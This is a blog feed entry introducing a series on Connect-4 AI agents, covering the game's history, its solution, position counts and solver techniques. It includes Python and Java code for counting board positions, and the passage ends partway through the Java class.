<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://markusthill.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://markusthill.github.io/" rel="alternate" type="text/html" hreflang="en"/><updated>2025-07-30T19:13:52+00:00</updated><id>https://markusthill.github.io/feed.xml</id><title type="html">blank</title><subtitle>Personal notes and code snippets on math, ML &amp; programming. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">Building Intelligent Agents for Connect-4: First Steps</title><link href="https://markusthill.github.io/blog/2025/connect-4-introduction-and-tree-search-algorithms/" rel="alternate" type="text/html" title="Building Intelligent Agents for Connect-4: First Steps"/><published>2025-07-04T08:00:51+00:00</published><updated>2025-07-04T08:00:51+00:00</updated><id>https://markusthill.github.io/blog/2025/connect-4-introduction-and-tree-search-algorithms</id><content type="html" xml:base="https://markusthill.github.io/blog/2025/connect-4-introduction-and-tree-search-algorithms/"><![CDATA[<p>This post is the 1st part of a series of 7 articles:</p> <ol> <li><strong><a href="/blog/2025/connect-4-introduction-and-tree-search-algorithms/">Building Intelligent Agents for Connect-4: First Steps</a></strong></li> <li><a href="TODO">Building Intelligent Agents for Connect-4: Tree Search Algorithms</a></li> <li><a href="TODO">Building Intelligent Agents for Connect-4: Board Representations</a></li> <li><a href="TODO">Building Intelligent Agents for Connect-4: Move Ordering</a></li> <li><a href="TODO">Building Intelligent Agents for Connect-4: Transposition Tables</a></li> <li><a href="TODO">Building Intelligent Agents for Connect-4: Opening Databases</a></li> <li><a href="TODO">Building Intelligent Agents for Connect-4: Final Considerations</a></li> </ol> <p>The study of strategic board games is a long-standing and foundational area of research in artificial intelligence (AI). Over the years, countless approaches have been explored‚Äîoften with very different goals and methodologies. Complex games such as chess, Go, and checkers have traditionally attracted significant attention due to their strategic depth and computational challenges.</p> <p>In this blog post‚Äîand in future entries‚Äîwe‚Äôll turn our attention to <em>Connect-4</em>. While simpler than the aforementioned classics, Connect-4 still offers interesting AI challenges. We‚Äôll explore various techniques for building strong-playing agents, ranging from handcrafted heuristics to learning-based and search-based methods.</p> <p>More recently, I developed a high-performance C++ and Python version of a Connect-4 solver called <strong>BitBully</strong>, available <a href="here">https://github.com/MarkusThill/BitBully</a> and <a href="here">https://pypi.org/project/bitbully/</a>.</p> <p>For those interested in a more educational or research-oriented setup, an earlier Java-based framework for <em>Connect-4</em> is also available on GitHub: <a href="http://github.com/MarkusThill/Connect-Four">http://github.com/MarkusThill/Connect-Four</a>.</p> <p><br/></p> <h2 id="introduction">Introduction</h2> <p>For decades, researchers have been fascinated by the question of whether machines can one day achieve a level of intelligence comparable to that of humans. This pursuit spans many fields, but one of the most established areas in artificial intelligence (AI) has been the development of intelligent programs capable of solving well-defined problems‚Äîstrategic board games being a prime example.</p> <p>The term <em>artificial intelligence</em> itself is difficult to pin down precisely, since even ‚Äúintelligence‚Äù remains a debated and multifaceted concept. One influential definition comes from computer scientist John McCarthy, who described AI as:</p> <blockquote> <p><em>‚ÄúThe science and engineering of making intelligent machines, especially intelligent computer programs. It is related to the similar task of using computers to understand human intelligence, but AI does not have to confine itself to methods that are biologically observable.‚Äù</em></p> </blockquote> <p>Strategic board games have long played a central role in AI research. Over the past 70 years, a vast body of work has investigated the development of machine players, each with different objectives and methods. Early efforts focused particularly on chess, where programs evolved from simple evaluation functions to systems capable of defeating world champions.</p> <p>A historical curiosity is the so-called <em>Mechanical Turk</em>, built in 1769 by Austrian-Hungarian inventor Wolfgang von Kempelen. Claimed to be an automated chess-playing machine, it captivated audiences across Europe‚Äîuntil it was later revealed that a human operator was hidden inside. Much later, during World War II, Konrad Zuse designed the first known chess program using his own programming language <em>Plankalk√ºl</em>.</p> <p>Milestones like IBM‚Äôs <em>Deep Blue</em> defeating world champion Garry Kasparov in 1997 showcased the potential of brute-force search, leveraging custom hardware to evaluate over 2 million positions per second. Since then, AI research has moved toward even more sophisticated approaches, incorporating learning and generalization.</p> <p>So why have board games become such a fertile ground for AI research?</p> <p>Several properties make them especially appealing:</p> <ul> <li><strong>Well-defined rules and goals</strong>: Most games have a fixed structure and a clearly defined win/loss condition. Unlike many real-world problems, the rules do not change mid-game.</li> <li><strong>Discrete and fully observable environments</strong>: The current state of the game is fully known at all times, and transitions between states are (usually) deterministic.</li> <li><strong>Manageable complexity with scalable difficulty</strong>: Despite their simplicity in terms of rules, many games have enormous state and action spaces, which demand clever search or learning strategies.</li> <li><strong>Relevance to broader AI problems</strong>: Concepts such as planning, decision-making, adversarial search, and pattern recognition all play a role.</li> </ul> <p>Humans excel at recognizing patterns, drawing analogies, and applying prior knowledge to new situations. For example, identifying familiar faces in photos or spotting tactical motifs in a chess position comes naturally to us. For machines, these tasks are far more difficult. Early AI systems in board games mostly relied on brute-force tree search and clever pruning. While effective, these systems lacked the ability to learn from experience in the human sense.</p> <p>Machine learning methods, particularly <em>Reinforcement Learning (RL)</em> and <em>Temporal Difference Learning (TDL)</em>, offer a different paradigm. In RL, an agent learns through interaction with its environment, receiving rewards based on outcomes. Over time, the agent develops a value function that helps evaluate positions and guide future decisions. Crucially, this process can allow the agent to improve its play autonomously‚Äîwithout relying on handcrafted rules or features.</p> <p>However, even modern learning systems often depend on carefully chosen features to represent game states. Selecting and engineering these features is itself a creative challenge and can significantly impact performance.</p> <p>In this blog series, we‚Äôll begin by exploring classical tree search algorithms and heuristics before diving into more advanced, learning-based approaches to mastering board games‚Äîstarting with <em>Connect-4</em>, a seemingly simple yet deeply strategic game.</p> <h2 id="connect-4">Connect-4</h2> <p><em>Connect-4</em> is a widely known two-player board game, typically played with the colors <em>Yellow</em> and <em>Red</em>, on a vertical grid consisting of seven columns and six rows. At the start of the game, the board is completely empty, offering 42 available positions.</p> <p>One of the defining characteristics of <em>Connect-4</em> is its vertical layout: players can only <strong>drop</strong> their discs into the top of a column. Due to gravity, a token always occupies the <strong>lowest unfilled row</strong> of the selected column. If a column is already filled with six tokens, no further moves can be made in that column, reducing the number of available options for both players.</p> <p>Players alternate turns, starting with Yellow, aiming to create a line of four connected tokens of their own color. These four aligned discs may appear:</p> <ul> <li><strong>Horizontally</strong></li> <li><strong>Vertically</strong></li> <li><strong>Diagonally</strong> (in either direction)</li> </ul> <p>The first player to align four of their tokens in a row wins the game. If neither player manages to achieve this by the time all 42 cells are filled, the game ends in a draw.</p> <p>Below is an example board position illustrating the game‚Äôs mechanics and strategic possibilities:</p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/2025-07-04-connect-4-introduction-and-tree-search-algorithms/C4-example-position-480.webp 480w,/assets/img/2025-07-04-connect-4-introduction-and-tree-search-algorithms/C4-example-position-800.webp 800w,/assets/img/2025-07-04-connect-4-introduction-and-tree-search-algorithms/C4-example-position-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/2025-07-04-connect-4-introduction-and-tree-search-algorithms/C4-example-position.png" class="img-fluid rounded z-depth-1 imgcenter" width="50%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> <figcaption class="caption"> <b>Figure 1:</b> Typical <em>Connect-4</em> position, created during a match of a temporal difference learning agent (Yellow) against a perfect playing Minimax agent (Red), with Minimax as the next player to move. Both types of agents will be described in later posts. For the given position, Minimax is under zugzwang and will eventually loose the game, however, the defeat could be delayed as far as possible. </figcaption> </figure> <p>Although <em>Connect-4</em> has a <strong>moderate state-space complexity</strong> of approximately<br/> \(4.5 \cdot 10^{12}\) distinct positions <a class="citation" href="#Edelkamp08">(Edelkamp &amp; Kissmann, 2008)</a>, and a <strong>game-tree complexity</strong> around<br/> \(10^{21}\) <a class="citation" href="#Allis94">(Allis, 1994)</a>, solving the game remains a non-trivial challenge even today.</p> <p>The first known solution was independently discovered by Allen <a class="citation" href="#Allen89">(Allen, 1989)</a> and Allis <a class="citation" href="#Allis88">(Allis, 1988)</a> in 1988. They <em>weakly solved</em> the game, demonstrating that‚Äîassuming perfect play from both players‚Äî<strong>Yellow can always force a win</strong> if she starts by placing her first token in the <strong>center column</strong>. While Red cannot win under optimal play, she can <strong>delay defeat</strong> and force Yellow to use all available moves.</p> <p>In 1994, Tromp <a class="citation" href="#Tromp94">(Bache &amp; Lichman, 2013)</a> went further and <em>strongly solved</em> the game for all positions with <strong>exactly 8 tokens</strong>, building a comprehensive endgame database that contains the game-theoretic values (win/loss/draw) of all <strong>non-trivial</strong> configurations.</p> <blockquote> <p><strong>Note:</strong> Tromp considered a position <em>trivial</em> if it contained an immediate win. While this is reasonable when Yellow has a direct winning move, it is debatable for Red: Red‚Äôs threats can often be neutralized by Yellow, allowing the game to proceed. Hence, the definition of triviality in this context is not entirely accurate.</p> </blockquote> <p>Tromp‚Äôs computation evaluated all <strong>67,557</strong> relevant positions and took approximately <strong>40,000 CPU hours</strong>‚Äîequivalent to about <strong>4.5 years</strong> of computation time.</p> <p>The table below shows the <strong>state-space complexity</strong> and <strong>leaf node counts</strong> for different numbers of plies. For instance, even with just <strong>12 tokens placed</strong> (i.e., after 12 plies), the state-space complexity is still about<br/> \(2.5 \cdot 10^5\) times smaller than that of the complete 42-token game<br/> (final value from <a class="citation" href="#Edelkamp08">(Edelkamp &amp; Kissmann, 2008)</a>).</p> <p>The source code used to generate the table is available in the appendix and on GitHub (<a href="https://github.com/MarkusThill/BitBully?tab=readme-ov-file#further-usage-examples-for-bitbully-core">Python</a> or <a href="https://github.com/MarkusThill/Connect-Four/blob/master/CFour/src/miscellaneous/CountPositionsC4.java">Java</a>).</p> <table> <tbody> <tr> <td>Plies</td> <td>Leaf Nodes</td> <td>State-Space Complexity</td> </tr> <tr> <td>0</td> <td>1</td> <td>1</td> </tr> <tr> <td>1</td> <td>7</td> <td>8</td> </tr> <tr> <td>2</td> <td>49</td> <td>57</td> </tr> <tr> <td>3</td> <td>238</td> <td>295</td> </tr> <tr> <td>4</td> <td>1,120</td> <td>1,415</td> </tr> <tr> <td>5</td> <td>4,263</td> <td>5,678</td> </tr> <tr> <td>6</td> <td>16,422</td> <td>22,100</td> </tr> <tr> <td>7</td> <td>53,955</td> <td>76,055</td> </tr> <tr> <td>8</td> <td>181,597</td> <td>257,652</td> </tr> <tr> <td>9</td> <td>534,085</td> <td>791,737</td> </tr> <tr> <td>10</td> <td>1,602,480</td> <td>2,394,217</td> </tr> <tr> <td>11</td> <td>4,231,877</td> <td>6,626,094</td> </tr> <tr> <td>12</td> <td>11,477,673</td> <td>18,102,767</td> </tr> <tr> <td>\(\vdots\)</td> <td>\(\vdots\)</td> <td>\(\vdots\)</td> </tr> <tr> <td>42</td> <td>?</td> <td>\(4,531,985,219,092 \approx 4.5 \times 10^{12}\)</td> </tr> </tbody> </table> <p>You can also find the list with up to 26 plies on <a href="https://oeis.org/A212693">OEIS</a>.</p> <p><br/></p> <h2 id="a-connect-4-agent-based-on-tree-search-techniques">A Connect-4 Agent Based on Tree-Search Techniques</h2> <h3 id="summary-of-the-upcoming-blog-posts">Summary of the Upcoming Blog Posts</h3> <p>Some time ago, I developed a <em>perfect-playing</em> Connect-4 agent. The project began with a simple <strong>Minimax</strong> agent‚Äîa classic tree-search algorithm‚Äîand was gradually refined with a series of optimizations. The final version integrates advanced search techniques and is supported by comprehensive databases to master the game‚Äôs opening phase.</p> <p>For <em>Connect-4</em>, we benefit from <strong>Tromp‚Äôs 8-ply opening database</strong>, which I further extended to include all 8-ply positions with <em>immediate threats for Yellow</em>, as these were originally omitted. Additionally, I generated a <strong>Huffman-encoded endgame database</strong> covering all positions with <strong>exactly 12 tokens</strong>, storing both the expected outcome and the precise number of moves remaining until the end of the game (under perfect play).</p> <p>The core <strong>Minimax search</strong> is enhanced with several techniques:</p> <ul> <li><strong>Alpha-Beta Pruning</strong></li> <li><strong>Move Ordering</strong></li> <li><strong>Symmetry Exploitation</strong></li> <li><strong>Zobrist Hashing</strong></li> <li><strong>Two-Stage Transposition Tables</strong> to detect repeated positions from different move orders</li> <li><strong>Enhanced Transposition Cutoffs (ETC)</strong></li> </ul> <h3 id="bitboards-for-fast-and-efficient-board-representation">Bitboards for Fast and Efficient Board Representation</h3> <p>The agent uses <strong>bitboards</strong> as the main data structure for board representation. In this scheme, each <em>Connect-4</em> cell is encoded using <strong>two bitfields</strong>, one per player, requiring a total of<br/> \(2 \times 42 = 84\) bits to represent a position. With a well-chosen layout of cells in memory, common operations become extremely efficient thanks to native CPU support for bitwise instructions (e.g., AND, OR, XOR, bit shifts).</p> <p>Typical board operations‚Äîsuch as placing/removing tokens, mirroring, rotation, copying, and detecting terminal states‚Äîcan be performed significantly faster with bitboards than with traditional structures like 2D arrays.</p> <p>In particular, <strong>terminal state detection</strong> (i.e., checking for 4-in-a-row) is a time-critical task in Connect-4. With bitboards, a highly optimized solution exists that vastly outperforms conventional implementations. Moreover, bitboards are memory-efficient, which is crucial when storing millions of positions in transposition tables.</p> <h3 id="performance-highlights">Performance Highlights</h3> <p>Thanks to all these optimizations, the agent ranks among the <strong>fastest perfect-playing Connect-4 solvers</strong>:</p> <ul> <li>On a vintage <strong>Pentium-4</strong> machine, it can solve the empty board in under <strong>4 minutes</strong>, <em>without</em> using any opening database and with just <strong>24 MB of transposition table memory</strong>.</li> <li>In the typical configuration‚Äîusing a <strong>12-ply opening database</strong> and the same <strong>24 MB transposition table</strong>‚Äîmost positions can be solved in a <strong>fraction of a second</strong>.</li> </ul> <hr/> <p>These techniques will be explored in greater detail in the upcoming blog posts.</p> <p><br/></p> <ul id="log" class="tab" data-tab="899b8a5a-cf67-4046-877b-66ee8bc0856e" data-name="log"> <li class="active" id="log-python-c--"> <a href="#">Python/C++ </a> </li> <li id="log-java"> <a href="#">Java </a> </li> </ul> <ul class="tab-content" id="899b8a5a-cf67-4046-877b-66ee8bc0856e" data-name="log"> <li class="active"> <h2 id="bitbully-a-high-speed-connect-4-solver">BitBully: A High-Speed Connect-4 Solver</h2> <p><strong>BitBully</strong> is a blazing-fast, perfect-playing <em>Connect-4</em> solver written in <strong>C++</strong> with seamless <strong>Python bindings</strong>. Designed for both developers and researchers, it offers a powerful toolkit for analyzing game-theoretic strategies and solving arbitrary board positions with high efficiency.</p> <p>Key features include:</p> <ul> <li><strong>Bitboard Engine</strong> using low-level bitwise operations</li> <li><strong>MTD(f)</strong> and <strong>null-window search</strong> for fast perfect-play solving</li> <li><strong>Opening database</strong> covering all positions up to 12 discs</li> <li><strong>Advanced heuristics</strong>: threat detection, transposition tables, move ordering</li> <li><strong>Cross-platform</strong> (Linux, Windows, macOS) with zero-setup Python wheels</li> <li><strong>Open Source</strong> under the AGPL-3.0 license</li> </ul> <p>Available here:<br/> üëâ <a href="https://github.com/MarkusThill/BitBully">GitHub</a> ¬∑ <a href="https://pypi.org/project/bitbully">PyPI</a> ¬∑ <a href="https://markusthill.github.io/BitBully">Docs</a></p> <p>Also, check out the related <a href="https://markusthill.github.io/projects/0_bitbully/">project page</a>.</p> </li> <li> <h2 id="connect-4-java-framework">Connect-4 Java Framework</h2> <p>A comprehensive software framework for <em>Connect-4</em> implemented in <strong>Java</strong> is available on GitHub. It provides a flexible environment for conducting learning experiments and evaluating different AI strategies.</p> <p>The framework includes a <strong>graphical user interface (GUI)</strong> that offers:</p> <ul> <li>Visual inspection of the game state and progress</li> <li>Tools for performance evaluation and analysis</li> <li>Import/export functionalities for game positions and statistics</li> <li>Interactive play between the user and various agents, including: <ul> <li>Random agents</li> <li>Temporal-Difference Learning (TDL) agents</li> <li>Minimax search agents</li> <li>Monte Carlo Tree Search (MCTS) agents</li> <li>And more</li> </ul> </li> </ul> <p>The framework is <strong>open-source</strong> and can be downloaded from:<br/> üëâ <a href="http://github.com/MarkusThill/Connect-Four">github.com/MarkusThill/Connect-Four</a></p> </li> </ul> <p><br/></p> <h2 id="references">References</h2> <div class="publications"> <ol class="bibliography"><li><div class="row"> <div class="col col-sm-2 abbr"> </div> <div id="Edelkamp08" class="col-sm-8"> <div class="title">Symbolic classification of general two-player games</div> <div class="author"> Stefan Edelkamp and Peter Kissmann </div> <div class="periodical"> <em>In KI 2008: Advances in Artificial Intelligence</em>, 2008 </div> <div class="periodical"> </div> <div class="links"> </div> </div> </div> </li> <li><div class="row"> <div class="col col-sm-2 abbr"> </div> <div id="Allis94" class="col-sm-8"> <div class="title">Searching for Solutions in Games and Artificial Intelligence</div> <div class="author"> Victor L. Allis </div> <div class="periodical"> <em>University of Limburg</em>, 1994 </div> <div class="periodical"> </div> <div class="links"> </div> </div> </div> </li> <li><div class="row"> <div class="col col-sm-2 abbr"> </div> <div id="Allen89" class="col-sm-8"> <div class="title">A Note on the Computer Solution of Connect-4</div> <div class="author"> James D. Allen </div> <div class="periodical"> <em>In Heuristic Programming in AI 1: The First Computer Olympiad</em>, 1989 </div> <div class="periodical"> </div> <div class="links"> </div> </div> </div> </li> <li><div class="row"> <div class="col col-sm-2 abbr"> </div> <div id="Allis88" class="col-sm-8"> <div class="title">A knowledge-based approach of Connect-4. The game is solved: White wins</div> <div class="author"> Victor L. Allis </div> <div class="periodical"> <em>Department of Mathematics and Computer Science, Vrije Universiteit, Amsterdam, The Netherlands</em>, 1988 </div> <div class="periodical"> </div> <div class="links"> </div> </div> </div> </li> <li><div class="row"> <div class="col col-sm-2 abbr"> </div> <div id="Tromp94" class="col-sm-8"> <div class="title">UCI Machine Learning Repository. Tromp‚Äôs 8-ply database</div> <div class="author"> K. Bache and M. Lichman </div> <div class="periodical"> 2013 </div> <div class="periodical"> </div> <div class="links"> </div> </div> </div> </li></ol> </div> <h2 id="counting-positions-on-the-connect-4-board-with-12-and-less-plies">Counting Positions on the Connect-4 Board with 12 and less Plies</h2> <ul id="count" class="tab" data-tab="89ce9563-c964-42b5-b5c0-bb58f94bf566" data-name="count"> <li class="active" id="count-python"> <a href="#">Python </a> </li> <li id="count-java"> <a href="#">Java </a> </li> </ul> <ul class="tab-content" id="89ce9563-c964-42b5-b5c0-bb58f94bf566" data-name="count"> <li class="active"> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">bitbully</span> <span class="kn">import</span> <span class="n">bitbully_core</span> <span class="k">as</span> <span class="n">bbc</span>

<span class="n">b</span> <span class="o">=</span> <span class="n">bbc</span><span class="p">.</span><span class="nc">Board</span><span class="p">()</span>  <span class="c1"># empty board
</span><span class="n">board_list_3ply</span> <span class="o">=</span> <span class="n">b</span><span class="p">.</span><span class="nf">allPositions</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="bp">True</span><span class="p">)</span>  <span class="c1"># All positions with exactly 3 tokens
</span><span class="nf">len</span><span class="p">(</span><span class="n">board_list_3ply</span><span class="p">)</span>  <span class="c1"># should be 238 according to https://oeis.org/A212693
</span></code></pre></div></div> </li> <li> <div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="kn">package</span> <span class="nn">miscellaneous</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.util.HashSet</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">c4.ConnectFour</span><span class="o">;</span>

<span class="cm">/**
 * * Always do 3 runs for counting the positions. First, count all positions
 * with a yellow stone in the left-bottom-corner, then with a red stone, and
 * last run when left-bottom-corner is empty. This is done, because the Hashset
 * can be reset after each run, and doesn't need that much memory.
 * 
 * @author Markus Thill
 * 
 */</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CountPositionsC4</span> <span class="kd">extends</span> <span class="nc">ConnectFour</span> <span class="o">{</span>
	<span class="kd">private</span> <span class="kt">int</span> <span class="n">maxDepth</span> <span class="o">=</span> <span class="mi">6</span><span class="o">;</span>
	<span class="kd">private</span> <span class="kt">boolean</span> <span class="n">countAll</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
	<span class="kd">private</span> <span class="kt">long</span> <span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
	<span class="nc">HashSet</span><span class="o">&lt;</span><span class="nc">LongArr</span><span class="o">&gt;</span> <span class="n">hs</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">HashSet</span><span class="o">&lt;</span><span class="nc">LongArr</span><span class="o">&gt;(</span><span class="mi">16777216</span><span class="o">);</span>

	<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="no">MASK</span> <span class="o">=</span> <span class="mh">0x20000000000</span><span class="no">L</span><span class="o">;</span>
	<span class="kt">int</span> <span class="n">run</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>

	<span class="kd">private</span> <span class="kt">void</span> <span class="nf">tree</span><span class="o">(</span><span class="kt">int</span> <span class="n">depth</span><span class="o">,</span> <span class="kt">int</span> <span class="n">player</span><span class="o">)</span> <span class="o">{</span>
		<span class="k">if</span> <span class="o">(</span><span class="n">depth</span> <span class="o">==</span> <span class="n">maxDepth</span> <span class="o">||</span> <span class="n">countAll</span><span class="o">)</span> <span class="o">{</span>

			<span class="kt">boolean</span> <span class="n">putElement</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
			<span class="k">switch</span> <span class="o">(</span><span class="n">run</span><span class="o">)</span> <span class="o">{</span>
			<span class="k">case</span> <span class="mi">0</span><span class="o">:</span> <span class="c1">// yellow stone in bottom-left corner</span>
				<span class="n">putElement</span> <span class="o">=</span> <span class="o">(</span><span class="n">fieldP1</span> <span class="o">&amp;</span> <span class="no">MASK</span><span class="o">)</span> <span class="o">==</span> <span class="no">MASK</span><span class="o">;</span>
				<span class="k">break</span><span class="o">;</span>
			<span class="k">case</span> <span class="mi">1</span><span class="o">:</span> <span class="c1">// red stone in bottom-left corner</span>
				<span class="n">putElement</span> <span class="o">=</span> <span class="o">(</span><span class="n">fieldP2</span> <span class="o">&amp;</span> <span class="no">MASK</span><span class="o">)</span> <span class="o">==</span> <span class="no">MASK</span><span class="o">;</span>
				<span class="k">break</span><span class="o">;</span>
			<span class="k">case</span> <span class="mi">2</span><span class="o">:</span> <span class="c1">// no stone in bottom-left corner</span>
				<span class="n">putElement</span> <span class="o">=</span> <span class="o">((</span><span class="n">fieldP1</span> <span class="o">|</span> <span class="n">fieldP2</span><span class="o">)</span> <span class="o">&amp;</span> <span class="no">MASK</span><span class="o">)</span> <span class="o">==</span> <span class="mh">0x0</span><span class="no">L</span><span class="o">;</span>
				<span class="k">break</span><span class="o">;</span>

			<span class="o">}</span>

			<span class="k">if</span> <span class="o">(</span><span class="n">putElement</span><span class="o">)</span> <span class="o">{</span>
				<span class="nc">LongArr</span> <span class="n">key</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">LongArr</span><span class="o">(</span><span class="n">fieldP1</span><span class="o">,</span> <span class="n">fieldP2</span><span class="o">);</span>
				<span class="k">if</span> <span class="o">(</span><span class="n">hs</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">key</span><span class="o">))</span> <span class="o">{</span>
					<span class="n">count</span><span class="o">++;</span>
					<span class="k">if</span> <span class="o">((</span><span class="n">count</span> <span class="o">&amp;</span> <span class="mh">0xFFFF</span><span class="no">L</span><span class="o">)</span> <span class="o">==</span> <span class="mh">0xFFFF</span><span class="no">L</span><span class="o">)</span> <span class="o">{</span>
						<span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Count until now: "</span> <span class="o">+</span> <span class="n">count</span><span class="o">);</span>
						<span class="nc">System</span><span class="o">.</span><span class="na">gc</span><span class="o">();</span>
					<span class="o">}</span>
				<span class="o">}</span>
			<span class="o">}</span>
			<span class="k">if</span> <span class="o">(</span><span class="n">depth</span> <span class="o">==</span> <span class="n">maxDepth</span><span class="o">)</span>
				<span class="k">return</span><span class="o">;</span>
		<span class="o">}</span>

		<span class="kt">int</span> <span class="n">moves</span><span class="o">[]</span> <span class="o">=</span> <span class="n">generateMoves</span><span class="o">(</span><span class="n">player</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
		<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">moves</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">!=</span> <span class="o">-</span><span class="mi">1</span><span class="o">;</span> <span class="n">i</span><span class="o">++)</span> <span class="o">{</span>
			<span class="k">if</span> <span class="o">(</span><span class="n">canWin</span><span class="o">(</span><span class="n">moves</span><span class="o">[</span><span class="n">i</span><span class="o">]))</span>
				<span class="k">return</span><span class="o">;</span>
			<span class="n">putPiece</span><span class="o">(</span><span class="n">player</span><span class="o">,</span> <span class="n">moves</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
			<span class="n">tree</span><span class="o">(</span><span class="n">depth</span> <span class="o">+</span> <span class="mi">1</span><span class="o">,</span> <span class="n">player</span> <span class="o">==</span> <span class="no">PLAYER1</span> <span class="o">?</span> <span class="no">PLAYER2</span> <span class="o">:</span> <span class="no">PLAYER1</span><span class="o">);</span>
			<span class="n">removePiece</span><span class="o">(</span><span class="n">player</span><span class="o">,</span> <span class="n">moves</span><span class="o">[</span><span class="n">i</span><span class="o">]);</span>
		<span class="o">}</span>
	<span class="o">}</span>

	<span class="cm">/**
	 * @param toPly
	 *            number of plys, for which number positions are calculated
	 * @param countAll
	 *            count all positions, not only leaf-nodes
	 */</span>
	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">countPositions</span><span class="o">(</span><span class="kt">int</span> <span class="n">toPly</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">countAll</span><span class="o">)</span> <span class="o">{</span>
		<span class="n">resetBoard</span><span class="o">();</span>
		<span class="n">hs</span><span class="o">.</span><span class="na">clear</span><span class="o">();</span>
		<span class="n">maxDepth</span> <span class="o">=</span> <span class="n">toPly</span><span class="o">;</span>
		<span class="n">count</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
		<span class="k">this</span><span class="o">.</span><span class="na">countAll</span> <span class="o">=</span> <span class="n">countAll</span><span class="o">;</span>

		<span class="k">for</span> <span class="o">(</span><span class="n">run</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span> <span class="n">run</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="o">;</span> <span class="n">run</span><span class="o">++)</span> <span class="o">{</span>
			<span class="n">resetBoard</span><span class="o">();</span>
			<span class="n">hs</span><span class="o">.</span><span class="na">clear</span><span class="o">();</span>
			<span class="n">maxDepth</span> <span class="o">=</span> <span class="n">toPly</span><span class="o">;</span>
			<span class="n">tree</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="no">PLAYER1</span><span class="o">);</span>
		<span class="o">}</span>

		<span class="k">if</span> <span class="o">(!</span><span class="n">countAll</span><span class="o">)</span>
			<span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Number of different positions for exactly "</span>
					<span class="o">+</span> <span class="n">maxDepth</span> <span class="o">+</span> <span class="s">" stones: "</span> <span class="o">+</span> <span class="n">count</span> <span class="o">+</span> <span class="s">""</span><span class="o">);</span>

		<span class="k">else</span>
			<span class="nc">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Number of different positions with 0 to "</span>
					<span class="o">+</span> <span class="n">maxDepth</span> <span class="o">+</span> <span class="s">" stones: "</span> <span class="o">+</span> <span class="n">count</span> <span class="o">+</span> <span class="s">""</span><span class="o">);</span>
	<span class="o">}</span>

	<span class="cm">/**
	 * @param plyRange
	 *            number of plys (range), for which number positions are
	 *            calculated
	 * @param countAll
	 *            count all positions, not only leaf-nodes
	 */</span>
	<span class="kd">public</span> <span class="kt">void</span> <span class="nf">countPositions</span><span class="o">(</span><span class="kt">int</span><span class="o">[]</span> <span class="n">plyRange</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">countAll</span><span class="o">)</span> <span class="o">{</span>
		<span class="k">for</span> <span class="o">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="n">plyRange</span><span class="o">[</span><span class="mi">0</span><span class="o">];</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="n">plyRange</span><span class="o">[</span><span class="mi">1</span><span class="o">];</span> <span class="n">i</span><span class="o">++)</span>
			<span class="n">countPositions</span><span class="o">(</span><span class="n">i</span><span class="o">,</span> <span class="n">countAll</span><span class="o">);</span>
	<span class="o">}</span>

	<span class="kd">private</span> <span class="kd">class</span> <span class="nc">LongArr</span> <span class="o">{</span>
		<span class="kd">private</span> <span class="kt">long</span> <span class="n">arr</span><span class="o">[];</span>

		<span class="nc">LongArr</span><span class="o">(</span><span class="kt">long</span> <span class="n">val1</span><span class="o">,</span> <span class="kt">long</span> <span class="n">val2</span><span class="o">)</span> <span class="o">{</span>
			<span class="n">arr</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">long</span><span class="o">[]</span> <span class="o">{</span> <span class="n">val1</span><span class="o">,</span> <span class="n">val2</span> <span class="o">};</span>
		<span class="o">}</span>

		<span class="kd">public</span> <span class="kt">int</span> <span class="nf">hashCode</span><span class="o">()</span> <span class="o">{</span>
			<span class="k">return</span> <span class="nc">Arrays</span><span class="o">.</span><span class="na">hashCode</span><span class="o">(</span><span class="n">arr</span><span class="o">);</span>
		<span class="o">}</span>

		<span class="kd">public</span> <span class="kt">boolean</span> <span class="nf">equals</span><span class="o">(</span><span class="nc">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
